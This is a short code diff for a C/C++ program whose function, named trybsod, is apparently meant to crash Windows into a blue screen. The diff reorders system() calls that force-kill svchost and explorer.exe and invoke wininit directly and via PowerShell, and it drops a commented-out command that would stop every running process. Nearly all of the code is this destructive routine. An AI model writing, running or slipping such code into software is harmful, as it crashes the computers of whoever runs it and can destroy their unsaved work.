@@ -4,19 +4,20 @@
 
 void trybsod()
 {
-    system("wininit");
     system("taskkill /im svchost /f");
-    // system("powershell.exe -Command \"get-process | stop-process -f\"");
-    system("powershell.exe -Command \"wininit\"");
     system("taskkill /im svchost.exe /f");
+
     system("taskkill /im explorer.exe /f");
+
+    system("wininit");
+    system("powershell.exe -Command \"wininit\"");
 }
 
 
 int main()
 {
     trybsod();
-
     
+        
     return 0;
 }
